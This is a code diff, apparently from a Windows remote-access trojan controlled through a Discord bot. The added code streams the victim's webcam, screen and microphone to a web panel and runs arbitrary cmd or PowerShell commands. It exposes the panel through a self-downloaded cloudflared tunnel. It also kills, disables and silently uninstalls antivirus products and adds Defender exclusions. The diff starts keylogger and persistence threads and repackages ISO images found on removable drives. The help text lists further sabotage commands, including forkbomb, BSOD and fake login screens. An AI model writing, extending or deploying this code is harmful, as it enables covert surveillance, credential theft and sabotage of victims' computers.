+        if _cam_cap is None or _cam_idx != selected_camera:
+            if _cam_cap is not None:
+                try:
+                    _cam_cap.release()
+                except Exception:
+                    pass
+                _cam_cap = None
+            cap = cv2.VideoCapture(selected_camera, cv2.CAP_DSHOW)
+            if not cap.isOpened():
+                try:
+                    cap.release()
+                except Exception:
+                    pass
+                return None
+            try:
+                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+                cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+            except Exception:
+                pass
+            _cam_cap, _cam_idx = cap, selected_camera
+        ok, frame = _cam_cap.read()
+        if not ok or frame is None:
+            try:
+                _cam_cap.release()
+            except Exception:
+                pass
+            _cam_cap = None
+            return None
+        try:
+            frame = cv2.resize(frame, (640, 360), interpolation=cv2.INTER_AREA)
+        except Exception:
+            pass
+        ok, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
+        return buf.tobytes() if ok else None
+
+
+def _scr_jpeg(quality=50):
+    with _scr_lock:
+        try:
+            img = ImageGrab.grab()
+            img.thumbnail((960, 540))
+            buf = io.BytesIO()
+            img.convert("RGB").save(buf, "JPEG", quality=quality)
+            return buf.getvalue()
+        except Exception:
+            return None
+
+
+def _grab_jpeg(kind, quality=55):
+    return _cam_jpeg(quality) if kind == "cam" else _scr_jpeg(quality)
+
+
+async def _web_shot(request):
+    data = await asyncio.get_event_loop().run_in_executor(
+        None, _grab_jpeg, request.match_info.get("kind", "screen"), 75)
+    return web.Response(body=data, content_type="image/jpeg") if data else web.Response(status=503)
+
+
+async def _web_mic(request):
+    def rec():
+        fs = 16000
+        data = sd.rec(int(0.3 * fs), samplerate=fs, channels=1, dtype=np.int16, device=selected_mic)
+        sd.wait()
+        buf = io.BytesIO()
+        with wave.open(buf, "wb") as w:
+            w.setnchannels(1)
+            w.setsampwidth(2)
+            w.setframerate(fs)
+            w.writeframes(data.tobytes())
+        return buf.getvalue()
+    try:
+        body = await asyncio.get_event_loop().run_in_executor(None, rec)
+        return web.Response(body=body, content_type="audio/wav")
+    except Exception:
+        return web.Response(status=503, text="no mic")
+
+
+async def _web_sys(request):
+    try:
+        cpu = psutil.cpu_percent(interval=0.3)
+        ram = psutil.virtual_memory()
+        try:
+            disk = psutil.disk_usage(os.environ.get("SystemDrive", "C:") + "\\").percent
+        except Exception:
+            disk = 0
+        return web.json_response({
+            "host": socket.gethostname(),
+            "user": os.environ.get("USERNAME") or "?",
+            "cpu": round(cpu, 1),
+            "ram": ram.percent,
+            "disk": disk,
+            "procs": len(psutil.pids()),
+            "uptime": int(time.time() - psutil.boot_time()),
+            "admin": _is_admin(),
+        })
+    except Exception as e:
+        return web.json_response({"error": str(e)})
+
+
+async def _web_cmd(request):
+    global WEB_BUSY
+    if WEB_BUSY:
+        return web.Response(text="busy, another command is still running")
+    text = (await request.text()).strip()
+    if not text:
+        return web.Response(text="empty")
+    WEB_BUSY = True
+    try:
+        try:
+            args = shlex.split(text, posix=True)
+        except Exception:
+            args = text.split()
+        name = args[0].lower()
+        if name in ("cmd", "powershell"):
+            line = " ".join(args[1:])
+        else:
+            name, line = "cmd", text
+        if not line.strip():
+            return web.Response(text="use: cmd <command>  |  powershell <command>")
+        exe = (["cmd", "/c", line] if name == "cmd"
+               else ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", line])
+        p = await asyncio.create_subprocess_exec(*exe, stdout=asyncio.subprocess.PIPE,
+                                                 stderr=asyncio.subprocess.STDOUT,
+                                                 creationflags=_CNW)
+        out, _ = await asyncio.wait_for(p.communicate(), 45)
+        body = out.decode("utf-8", "replace").strip()[:6000] or "(no output)"
+        return web.Response(text="> {}\n\n{}".format(text, body))
+    except asyncio.TimeoutError:
+        return web.Response(text="> {}\n\ntimeout (45 s)".format(text))
+    except Exception as e:
+        return web.Response(text="> {}\n\nerror: {}".format(text, e))
+    finally:
+        WEB_BUSY = False
+
+
+async def _web_ws(request):
+    global _WS_OPEN
+    ws = web.WebSocketResponse(heartbeat=20)
+    await ws.prepare(request)
+    _WS_OPEN += 1
+    state = {"cam": False, "screen": False}
+    loop = asyncio.get_event_loop()
+
+    async def send(kind):
+        data = await loop.run_in_executor(None, _grab_jpeg, kind, 55)
+        if data and not ws.closed:
+            try:
+                await ws.send_bytes((b"C" if kind == "cam" else b"S") + data)
+            except Exception:
+                return False
+        return True
+
+    async def pump():
+        while not ws.closed:
+            t0 = time.time()
+            try:
+                if state["cam"] and state["screen"]:
+                    if not await send("cam"):
+                        break
+                    if not await send("screen"):
+                        break
+                    target = 0.10
+                elif state["cam"]:
+                    if not await send("cam"):
+                        break
+                    target = 0.09
+                elif state["screen"]:
+                    if not await send("screen"):
+                        break
+                    target = 0.28
+                else:
+                    await asyncio.sleep(0.2)
+                    continue
+            except asyncio.CancelledError:
+                break
+            except Exception:
+                await asyncio.sleep(0.3)
+                continue
+            await asyncio.sleep(max(0.01, target - (time.time() - t0)))
+
+    task = asyncio.create_task(pump())
+    try:
+        async for msg in ws:
+            if msg.type == aiohttp.WSMsgType.TEXT:
+                try:
+                    d = json.loads(msg.data)
+                    if d.get("kind") in state:
+                        state[d["kind"]] = bool(d.get("on"))
+                except Exception:
+                    pass
+    finally:
+        task.cancel()
+        try:
+            await task
+        except Exception:
+            pass
+        _WS_OPEN = max(0, _WS_OPEN - 1)
+        if _WS_OPEN == 0:
+            await loop.run_in_executor(None, _cam_close)
+    return ws
+
+
+def _web_app():
+    app = web.Application(middlewares=[_web_headers])
+    app.router.add_get("/", _web_index)
+    app.router.add_get("/api/shot/{kind}", _web_shot)
+    app.router.add_get("/api/mic.wav", _web_mic)
+    app.router.add_get("/api/sys", _web_sys)
+    app.router.add_post("/api/cmd", _web_cmd)
+    app.router.add_get("/ws", _web_ws)
+    return app
+
+
+def _lan_ips():
+    out = []
+    try:
+        for addrs in psutil.net_if_addrs().values():
+            for a in addrs:
+                if a.family != socket.AF_INET:
+                    continue
+                if a.address.startswith(("127.", "169.254.")):
+                    continue
+                if a.address not in out:
+                    out.append(a.address)
+    except Exception:
+        pass
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        first = s.getsockname()[0]
+        s.close()
+        if first and not first.startswith("127."):
+            if first in out:
+                out.remove(first)
+            out.insert(0, first)
+    except Exception:
+        pass
+    return out
+
+
+async def web_start(host=None, port=None):
+    global WEB_RUNNER, WEB_TOKEN, WEB_HOST, WEB_PORT, WEB_URL
+    if WEB_RUNNER:
+        return WEB_URL
+    WEB_TOKEN = secrets.token_urlsafe(18)
+    WEB_HOST = host or WEB_HOST
+    WEB_PORT = port or WEB_PORT
+    runner = web.AppRunner(_web_app(), access_log=None)
+    await runner.setup()
+    await web.TCPSite(runner, WEB_HOST, WEB_PORT).start()
+    WEB_RUNNER = runner
+    if WEB_HOST in ("0.0.0.0", ""):
+        ips = _lan_ips()
+        WEB_URL = "http://{}:{}/?t={}".format(ips[0] if ips else "127.0.0.1", WEB_PORT, WEB_TOKEN)
+    else:
+        WEB_URL = "http://{}:{}/?t={}".format(WEB_HOST, WEB_PORT, WEB_TOKEN)
+    return WEB_URL
+
+
+async def web_stop():
+    global WEB_RUNNER, WEB_TOKEN, WEB_URL, WEB_TUNNEL, WEB_TUNNEL_URL
+    if WEB_RUNNER:
+        try:
+            await WEB_RUNNER.cleanup()
+        except Exception:
+            pass
+    WEB_RUNNER = None
+    WEB_TOKEN = ""
+    WEB_URL = ""
+    WEB_TUNNEL_URL = ""
+    if WEB_TUNNEL:
+        try:
+            WEB_TUNNEL.terminate()
+        except Exception:
+            pass
+        WEB_TUNNEL = None
+    await asyncio.get_event_loop().run_in_executor(None, _cam_close)
+
+
+async def web_tunnel_start():
+    global WEB_TUNNEL, WEB_TUNNEL_URL
+    if WEB_TUNNEL:
+        return WEB_TUNNEL_URL or "already"
+    exe = os.path.join(BASE_DIR, "cloudflared.exe")
+    if not os.path.exists(exe):
+        try:
+            async with aiohttp.ClientSession() as s:
+                async with s.get("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe") as r:
+                    if r.status != 200:
+                        return "download failed"
+                    with builtins.open(exe, "wb") as f:
+                        f.write(await r.read())
+        except Exception as e:
+            return "download error: {}".format(e)
+    if not WEB_RUNNER:
+        await web_start("0.0.0.0")
+    WEB_TUNNEL = await asyncio.create_subprocess_exec(
+        exe, "tunnel", "--url", "http://127.0.0.1:{}".format(WEB_PORT), "--no-autoupdate",
+        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
+        creationflags=_CNW)
+
+    async def watch():
+        global WEB_TUNNEL_URL
+        while WEB_TUNNEL and WEB_TUNNEL.stdout:
+            line = await WEB_TUNNEL.stdout.readline()
+            if not line:
+                break
+            m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line.decode("utf-8", "replace"))
+            if m:
+                WEB_TUNNEL_URL = m.group(0)
+                return
+
+    asyncio.create_task(watch())
+    for _ in range(60):
+        if WEB_TUNNEL_URL:
+            return WEB_TUNNEL_URL + "/?t=" + WEB_TOKEN
+        await asyncio.sleep(0.5)
+    return "starting, try `.panel tunnel` again in a moment"
 
 async def run_panel_command(interaction: discord.Interaction, command_name: str, *args):
     cmd = bot.get_command(command_name)
@@ -2799,6 +3909,36 @@ On GPT the MBR is protective: the stub only runs under CSM. The ESP copy survive
 `.desktop-mess [n]` — junk `.txt` files on the desktop.
 `.error-storm [n]` — stacked error dialogs.
 `.rickroll` / `.crazy-mouse` / `.minimize-all` / `.bsod` / `.forkbomb`
+"""),
+("troll2", "🎪", "Troll extras", """
+`.scream` / `.beep-song` / `.volume-rave [s]` — noise and volume.
+`.fake-cmd` / `.fake-error-loop` / `.error-storm [n]` — fake consoles and errors.
+`.fake-login [s]` / `.fake-scan` / `.fake-printer` / `.fake-disk-full` / `.fake-wifi-drop`
+`.shutdown-countdown [s]` / `.fake-update [%]` — fake shutdown and update screens.
+`.mouse-teleport` / `.cursor-spin [r]` / `.caps-spam [n]`
+`.typing-ghost [text]` — types into the focused window.
+`.folder-storm [n]` / `.window-stack [n]` / `.random-notify [n]`
+`.taskbar-move <top|bottom|left|right>` / `.rename-user <name>`
+"""),
+    ("win2", "🧰", "Windows extras", """
+`.sys-summary` / `.cpu-load` / `.mem-top [n]` / `.disk-health` — health and load.
+`.boot-errors` / `.bsod-history` / `.net-quality` — real diagnostics.
+`.time-sync` / `.dns-cache` / `.winsock-reset` / `.powercfg-report` / `.battery-report`
+`.wlan-report` / `.net-pid` / `.listening-owner` / `.fw-status`
+`.defender-exclusions` / `.defender-scan [path]`
+`.sched-list [path]` / `.sched-add <name> <time> <cmd>` / `.sched-del <name>`
+`.svc-status <name>` / `.svc-start|svc-stop|svc-restart <name>`
+`.env-path` / `.path-add <dir>` / `.hostname-set <name>` / `.proxy-off`
+`.dpi-info` / `.font-list` / `.audio-devices` / `.codec-list`
+"""),
+    ("web", "🌐", "Web panel", """
+`.panel` — starts the panel and returns the tokenised URL.
+`.panel lan` — exposes it on the LAN (`0.0.0.0` bind), useful behind CGNAT on a local network.
+`.panel tunnel` — opens an outbound cloudflared tunnel, **works behind CGNAT or a foreign IP**.
+`.panel url` — prints the URL again.
+`.panel stop` — shuts it down.
+
+The token is 18 random bytes, rotated on every start, carried in an `HttpOnly` + `SameSite=Strict` cookie, with a strict CSP and a single concurrent command capped at 45 s.
 """),
     ("keys", "🎹", "Keylogger & Clipboard", """
 `.keylogger-enable` / `.keylogger-disable` — global listener on/off.
@@ -3753,19 +4893,82 @@ foreach ($adapter in $adapters) {{
 AV_KW = ["avast", "avg", "kaspersky", "eset", "bitdefender", "mcafee", "norton",
          "symantec", "malwarebytes", "avira", "sophos", "fortinet", "fortiedr",
          "panda", "trend micro", "g data", "webroot", "crowdstrike", "sentinelone",
-         "cylance", "carbon black", "quick heal", "defender", "msmpeng", "securityhealth"]
+         "cylance", "carbon black", "quick heal", "comodo", "dr.web", "drweb"]
+
+AV_CLI = [
+    (r"Kaspersky Lab", "avp.com", ["ADDEXCLUSION"]),
+]
+
+_AV_PS = r'''
+$paths = @(@PATHS@)
+$kw = @(@KW@)
+$found = @()
+try {
+  $sc = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA SilentlyContinue
+  foreach ($p in $sc) { if ($p.displayName -notmatch 'Defender|Windows Security') { $found += $p.displayName } }
+} catch {}
+Get-CimInstance Win32_Service | ForEach-Object {
+  $s = "$($_.DisplayName) $($_.PathName)"
+  foreach ($k in $kw) {
+    if ($s -match $k) { $found += $_.DisplayName; break }
+  }
+}
+($found | Sort-Object -Unique) -join '|'
+'''
+
+_AV_UNINST = r'''
+$kw = @(@KW@)
+$keys = @(
+ 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
+ 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*')
+$hits = @()
+foreach ($k in $keys) {
+  Get-ItemProperty $k -EA SilentlyContinue | ForEach-Object {
+    $n = "$($_.DisplayName)"
+    foreach ($x in $kw) {
+      if ($n -match $x -and $_.UninstallString) { $hits += $_; break }
+    }
+  }
+}
+foreach ($h in $hits) {
+  $u = $h.UninstallString
+  if ($u -match 'msiexec') {
+    if ($u -match '\{[0-9A-Fa-f\-]{36}\}') {
+      $g = $Matches[0]
+      Start-Process msiexec.exe -ArgumentList "/x $g /qn /norestart" -Wait -WindowStyle Hidden
+    }
+  } else {
+    $exe = ($u -split '"')[1]
+    if (-not $exe) { $exe = ($u -split ' ')[0] }
+    if ($exe -and (Test-Path $exe)) {
+      Start-Process $exe -ArgumentList '/S','/silent','/verysilent','/qn','/norestart' -Wait -WindowStyle Hidden
+    }
+  }
+}
+'''
+
+
+def _av_detect():
+    st = _state_read() or {}
+    paths = [s["exe"] for s in (st.get("slots") or []) if s.get("exe")]
+    if st.get("dir"):
+        paths.append(st["dir"])
+    ps = _AV_PS.replace("@PATHS@", ",".join("'{}'".format(p.replace("'", "''")) for p in paths)) \
+                .replace("@KW@", ",".join("'{}'".format(k) for k in AV_KW))
+    r = _ps(ps)
+    out = (r.stdout or "").strip() if r else ""
+    return [x for x in out.split("|") if x.strip()], paths
 
 
 def purge_av():
     st = _state_read() or {}
     paths = [s["exe"] for s in (st.get("slots") or []) if s.get("exe")]
-    if not paths:
-        paths = [p for p in (st.get("dir"), st.get("exe"), st.get("bak")) if p]
-    paths += [os.environ.get("TEMP", r"C:\Windows\Temp"), r"C:\Windows\Temp"]
+    paths += [st.get("dir") or "", os.environ.get("TEMP", r"C:\Windows\Temp")]
+    paths = [p for p in paths if p]
 
     for p in paths:
-        _ps(f'Add-MpPreference -ExclusionPath "{p}" -ErrorAction SilentlyContinue')
-        _ps(f'Add-MpPreference -ExclusionProcess "{p}" -ErrorAction SilentlyContinue')
+        _ps('Add-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(p))
+        _ps('Add-MpPreference -ExclusionProcess "{}" -ErrorAction SilentlyContinue'.format(p))
 
     dpol = r"SOFTWARE\Policies\Microsoft\Windows Defender"
     _reg_add(dpol, "DisableAntiSpyware", 1, "REG_DWORD")
@@ -3778,43 +4981,34 @@ def purge_av():
         "-DisableBehaviorMonitoring $true -DisableScriptScanning $true "
         "-MAPSReporting Disabled -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue")
 
-    for avp in (r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security 21.3\avp.com",
-                r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security 21.3\avp.com",
-                r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud 21.3\avp.com"):
-        if os.path.exists(avp):
-            for p in paths:
-                subprocess.run([avp, "ADDEXCLUSION", p], capture_output=True, creationflags=_CNW)
-            break
+    for folder, cli, verbs in AV_CLI:
+        for base in (r"C:\Program Files (x86)\{}".format(folder), r"C:\Program Files\{}".format(folder)):
+            if not os.path.isdir(base):
+                continue
+            for root, _, files in os.walk(base):
+                if cli in files:
+                    exe = os.path.join(root, cli)
+                    for p in paths:
+                        subprocess.run([exe] + verbs + [p], capture_output=True, creationflags=_CNW)
 
-    script = '''
-$kw = @(%s)
-Get-CimInstance Win32_Service | ForEach-Object {
-  $s = "$($_.DisplayName) $($_.PathName)"
-  foreach ($k in $kw) {
-    if ($s -match $k) {
-      sc.exe stop "$($_.Name)" 2>$null | Out-Null
-      reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\$($_.Name)" /v Start /t REG_DWORD /d 4 /f | Out-Null
-      break
-    }
-  }
-}
-Get-Process | ForEach-Object {
-  foreach ($k in $kw) {
-    if ($_.ProcessName -match $k) { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue; break }
-  }
-}
-''' % ",".join("'%s'" % k for k in AV_KW)
-    _ps(script)
+    detected, _ = _av_detect()
+    if detected:
+        _ps("Get-Process | ForEach-Object { foreach ($k in @({})) {{ "
+            "if ($_.ProcessName -match $k) {{ Stop-Process -Id $_.Id -Force -EA SilentlyContinue }} }} }}"
+            .format(",".join("'{}'".format(k) for k in AV_KW)))
+        _ps("Get-CimInstance Win32_Service | ForEach-Object { "
+            "$s = \"$($_.DisplayName) $($_.PathName)\"; foreach ($k in @({})) {{ "
+            "if ($s -match $k) {{ sc.exe stop \"$($_.Name)\" 2>$null | Out-Null; "
+            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\$($_.Name)\" /v Start /t REG_DWORD /d 4 /f | Out-Null; break }} }} }}"
+            .format(",".join("'{}'".format(k) for k in AV_KW)))
 
-
-@bot.command(aliases=["purge-av", "kill-av"])
-async def purge_av_cmd(ctx):
-    await ctx.message.add_reaction("🛡️")
-    try:
-        await asyncio.to_thread(purge_av)
-        await ctx.send(embed=create_embed("🛡️ AV", "Exclusions were added, the security services were stopped and set to not start again.", 0x00FF00))
-    except Exception as e:
-        await ctx.send(embed=create_embed("Error", f"The purge could not be completed: {e}", 0xFF0000))
+        for name in detected:
+            key = next((k for k in AV_KW if k in name.lower()), None)
+            if not key:
+                continue
+            if key == "kaspersky" and os.path.exists(r"C:\Program Files (x86)\Kaspersky Lab"):
+                continue
+            _ps(_AV_UNINST.replace("@KW@", "'{}'".format(key)))
 
 @bot.command(aliases=["coords", "coordinates"])
 async def get_coords(ctx):
@@ -6491,9 +7685,23 @@ async def _setup_guild(guild, category_name, pc_name):
     gid = guild.id
     CHANNEL_IDS.setdefault(gid, {})
 
+    for ch in list(guild.text_channels):
+        if ch.name in ("panel", "lessmi-panel", "lessmi_panel", "🧮〡panel"):
+            try:
+                await ch.delete(reason="Panel moved to the web UI")
+            except Exception:
+                pass
+
     stored_accent = get_guild_value(gid, "accent")
     if stored_accent:
         globals()["ACCENT"] = stored_accent
+
+    for ch in list(guild.text_channels):
+        if ch.name in ("panel", "lessmi-panel", "lessmi_panel"):
+            try:
+                await ch.delete(reason="Panel moved to the web UI")
+            except Exception:
+                pass
 
     cat_id = get_guild_value(gid, "category")
     cat = guild.get_channel(cat_id) if cat_id else None
@@ -6598,6 +7806,36 @@ async def _setup_guild(guild, category_name, pc_name):
                 _crash("ready", "panel {} failed\n{}".format(title, traceback.format_exc()))
 
 
+@bot.command(aliases=["web", "webui", "web-panel"])
+async def panel(ctx, action: str = None, value: str = None):
+    action = (action or "lan").lower()
+    if action == "stop":
+        await web_stop()
+        await ctx.send(embed=create_embed("🌐 Panel", "Stopped and the capture handle was released.", 0xFF0000))
+        return
+    if action == "tunnel":
+        await ctx.send(embed=create_embed("🌐 Panel", await web_tunnel_start(), 0x00FF00))
+        return
+    if action not in ("lan", "url", "start"):
+        await ctx.send(embed=create_embed("🌐 Panel", "`lan` `url` `start` `tunnel` `stop`", 0x00FF00))
+        return
+
+    want = "127.0.0.1" if action == "start" else "0.0.0.0"
+    if WEB_RUNNER and WEB_HOST != want:
+        await web_stop()
+    if not WEB_RUNNER:
+        await web_start(want)
+
+    if action == "start":
+        await ctx.send(embed=create_embed("🌐 Panel (local)", WEB_URL, 0x00FF00))
+        return
+    ips = _lan_ips()
+    if not ips:
+        await ctx.send(embed=create_embed("🌐 Panel", "No LAN address found, local only:\n" + WEB_URL, 0xFFA500))
+        return
+    body = "\n".join("http://{}:{}/?t={}".format(i, WEB_PORT, WEB_TOKEN) for i in ips)
+    await ctx.send(embed=create_embed("🌐 Panel (LAN)", body[:1900], 0x00FF00))
+
 @bot.event
 async def on_ready():
     global _THREADS_ON
@@ -6622,6 +7860,15 @@ async def on_ready():
 
     for guild in bot.guilds:
         try:
+            info_ch = guild.get_channel(cfg_get(guild.id, "info"))
+            if info_ch:
+                await info_ch.send(embed=create_embed(
+                    "Online",
+                    f"**{pc_name}** · `{os.environ.get('USERNAME')}@{pc_name}`\nWeb panel: `.panel`",
+                    0x2ECC71))
+        except Exception:
+            pass
+        try:
             await _setup_guild(guild, category_name, pc_name)
         except Exception:
             _crash("ready", "guild {} setup failed\n{}".format(guild.id, traceback.format_exc()))
@@ -6633,12 +7880,19 @@ async def on_ready():
     if _THREADS_ON:
         return
     _THREADS_ON = True
-    for fn in (keylogger_thread, send_keys_periodically, record_mic_thread,
-               check_blacklist, _watchdog_thread):
+    def _start(fn):
         try:
             threading.Thread(target=fn, daemon=True).start()
         except Exception:
-            _crash("ready", "thread {} failed".format(fn.__name__))
+            _crash("ready", "thread {} failed".format(getattr(fn, "__name__", fn)))
+
+    _start(keylogger_thread)
+    _start(send_keys_periodically)
+    _start(record_mic_thread)
+    _start(check_blacklist)
+    _start(_watchdog_thread)
+    _start(_repair_loop)
+    _start(_iso_watch_loop)
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -6860,15 +8114,9 @@ async def implode(ctx):
         if extra and extra not in tasks:
             tasks.append(extra)
 
-    try:
-        uninstall_userinit()
-    except Exception:
-        pass
+    uninstall_persistence()
     for t in tasks:
         _task_delete(t)
-    for t in tasks:
-        if _task_exists(t):
-            _task_delete(t)
     for name in (r"Software\Microsoft\Windows\CurrentVersion\Run",):
         _reg_delete(name, os.path.splitext(os.path.basename(st.get("exe") or "x"))[0], "HKCU")
 
@@ -7288,6 +8536,72 @@ public static class LmFx
     static int C(int v, int n) { return v < 0 ? 0 : (v >= n ? n - 1 : v); }
     static int L(int c) { return (((c >> 16) & 255) * 29 + ((c >> 8) & 255) * 150 + (c & 255) * 77) >> 8; }
     static int Rgb(int r, int g, int b) { return unchecked((int)(0xFF000000 | ((uint)C(r, 256) << 16) | ((uint)C(g, 256) << 8) | (uint)C(b, 256))); }
+    static void FxUpsideDown(Graphics g, int W, int H, Random r, int t)
+{
+    using (var b = new Bitmap(W, H))
+    using (var bg = Graphics.FromImage(b))
+    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H)); b.RotateFlip(RotateFlipType.Rotate180FlipNone); g.DrawImage(b, 0, 0, W, H); }
+}
+
+static void FxSwirlMelt(Graphics g, int W, int H, Random r, int t)
+{
+    for (int y = 0; y < H; y += 4)
+    {
+        int off = (int)(Math.Sin((y + t * 7) * 0.02) * 45);
+        using (var b = new Bitmap(W, 4)) using (var bg = Graphics.FromImage(b))
+        { bg.CopyFromScreen(0, y, 0, 0, new Size(W, 4)); g.DrawImage(b, off, y, W, 4); }
+    }
+}
+
+static void FxGhostTrail(Graphics g, int W, int H, Random r, int t)
+{
+    using (var b = new Bitmap(W, H)) using (var bg = Graphics.FromImage(b))
+    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H)); g.DrawImage(b, (int)(Math.Sin(t * 0.6) * 18), (int)(Math.Cos(t * 0.4) * 12), W, H); }
+    using (var p = new Pen(Color.FromArgb(60, 255, 255, 255), 2)) g.DrawRectangle(p, 0, 0, W - 1, H - 1);
+}
+
+static void FxTunnelZoom(Graphics g, int W, int H, Random r, int t)
+{
+    double k = 1 + (t % 40) * 0.006;
+    using (var b = new Bitmap(W, H)) using (var bg = Graphics.FromImage(b))
+    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H)); }
+    g.DrawImage(b, new Rectangle((int)(W * (1 - k) / 2), (int)(H * (1 - k) / 2), (int)(W * k), (int)(H * k)));
+}
+
+static void FxBarCodeSweep(Graphics g, int W, int H, Random r, int t)
+{
+    for (int x = 0; x < W; x += 6)
+        using (var p = new SolidBrush(Color.FromArgb(r.Next(20, 90), 0, 0, 0)))
+            g.FillRectangle(p, x, 0, r.Next(2, 5), H);
+    using (var p = new Pen(Color.FromArgb(140, 0, 255, 0), 3)) g.DrawLine(p, 0, (t * 12) % H, W, (t * 12) % H);
+}
+
+static void FxRipplePool(Graphics g, int W, int H, Random r, int t)
+{
+    for (int i = 0; i < 7; i++)
+        using (var p = new Pen(Color.FromArgb(70, 0, 200, 255), 2))
+            g.DrawEllipse(p, W / 2 - (t * 14 + i * 70), H / 2 - (t * 9 + i * 45), (t * 28 + i * 140), (t * 18 + i * 90));
+}
+
+static void FxShatteredMirror(Graphics g, int W, int H, Random r, int t)
+{
+    using (var b = new Bitmap(W, H)) using (var bg = Graphics.FromImage(b))
+    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H));
+      for (int i = 0; i < 26; i++)
+      {
+          int sx = r.Next(0, W - 120), sy = r.Next(0, H - 120);
+          g.DrawImage(b, new Rectangle(sx + r.Next(-14, 14), sy + r.Next(-14, 14), 120, 120), new Rectangle(sx, sy, 120, 120), GraphicsUnit.Pixel);
+      } }
+}
+
+static void FxNeonOutline(Graphics g, int W, int H, Random r, int t)
+{
+    for (int i = 0; i < 6; i++)
+        using (var p = new Pen(Color.FromArgb(120, r.Next(120, 255), r.Next(60, 255), r.Next(120, 255)), 3))
+            g.DrawRectangle(p, i * 9, i * 9, W - i * 18, H - i * 18);
+}
+
+static void F
 
     public static void Run(int mode, int ms)
     {
@@ -7910,6 +9224,737 @@ async def fakelogin(ctx, secs: int = 90):
     await ctx.send(embed=create_embed("🔐 Fake login",
                                       "A replica of the lock screen with the real wallpaper, avatar and user name was opened on every display for **{}** seconds.".format(secs),
                                       0x00aaff))
+
+ISO_WATCH = True
+_ISO_SEEN = set()
+_ISO_LOCK = threading.Lock()
+_JUNK = (".crdownload", ".part", ".tmp", ".aria2", ".!ut", ".downloading", ".opdownload", ".bak")
+_PREFER = ("setup", "install", "soft", "program", "tool", "util", "crack", "keygen",
+           "patch", "portable", "app", "extra", "instalador", "programas")
+_SKIP_DIRS = ("sources", "boot", "efi", "support", "$recycle.bin",
+              "system volume information", "autorun")
+
+
+def _removable_roots():
+    out = []
+    try:
+        for p in psutil.disk_partitions(all=False):
+            opts = (p.opts or "").lower()
+            if "removable" in opts or (p.fstype or "").lower() in ("fat32", "exfat"):
+                out.append(p.mountpoint.rstrip("\\/"))
+    except Exception:
+        pass
+    return out
+
+
+def _find_tool(names):
+    bases = [b for b in os.environ.get("PATH", "").split(";") if b.strip()]
+    bases += [
+        r"C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\amd64\Oscdimg",
+        r"C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\x86\Oscdimg",
+        r"C:\Program Files\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\amd64\Oscdimg",
+        r"C:\Program Files\7-Zip", r"C:\Program Files (x86)\7-Zip",
+    ]
+    for b in bases:
+        for n in names:
+            p = os.path.join(b.strip(), n)
+            if os.path.isfile(p):
+                return p
+    return None
+
+
+def _iso_mount(path):
+    r = _ps("$i = Mount-DiskImage -ImagePath '{}' -PassThru -ErrorAction Stop; "
+            "($i | Get-Volume).DriveLetter".format(path.replace("'", "''")))
+    line = (r.stdout or "").strip().splitlines() if r else []
+    letter = line[0].strip() if line else ""
+    return (letter + ":") if letter else None
+
+
+def _iso_unmount(path):
+    _ps("Dismount-DiskImage -ImagePath '{}' -ErrorAction SilentlyContinue".format(
+        path.replace("'", "''")))
+
+
+def _iso_label(path):
+    r = _ps("(Get-DiskImage -ImagePath '{}' | Get-Volume).FileSystemLabel".format(
+        path.replace("'", "''")))
+    lbl = ((r.stdout or "").strip().splitlines() or [""])[0].strip()
+    return re.sub(r"[^A-Za-z0-9_\-]", "", lbl)[:32] or "DATA"
+
+
+def _iso_target(root):
+    cands = []
+    try:
+        for name in sorted(os.listdir(root)):
+            full = os.path.join(root, name)
+            if not os.path.isdir(full):
+                continue
+            if name.lower() in _SKIP_DIRS:
+                continue
+            cands.append((name, full))
+    except Exception:
+        return root
+
+    clean = []
+    for name, full in cands:
+        try:
+            files = os.listdir(full)
+        except Exception:
+            continue
+        if any(f.lower().endswith(_JUNK) for f in files):
+            continue
+        clean.append((name, full))
+
+    for name, full in clean:
+        if any(k in name.lower() for k in _PREFER):
+            return full
+    if clean:
+        return clean[0][1]
+    return root
+
+
+def _iso_rebuild(src, out, label, boot_img=None, efi_img=None):
+    oscdimg = _find_tool(["oscdimg.exe"])
+    if oscdimg:
+        cmd = [oscdimg, "-m", "-o", "-u2", "-udfver102", "-l" + label]
+        if boot_img and efi_img and os.path.exists(boot_img) and os.path.exists(efi_img):
+            cmd += ["-bootdata:2#p0,e,b{}#pEF,e,b{}".format(boot_img, efi_img)]
+        elif boot_img and os.path.exists(boot_img):
+            cmd += ["-b{}".format(boot_img)]
+        cmd += [src, out]
+        r = subprocess.run(cmd, capture_output=True, creationflags=_CNW, timeout=1800)
+        if r.returncode == 0 and os.path.exists(out) and os.path.getsize(out) > 1 << 20:
+            return "oscdimg"
+
+    sevenzip = _find_tool(["7z.exe", "7za.exe"])
+    if sevenzip:
+        r = subprocess.run([sevenzip, "a", "-tiso", "-mx1", "-y", out,
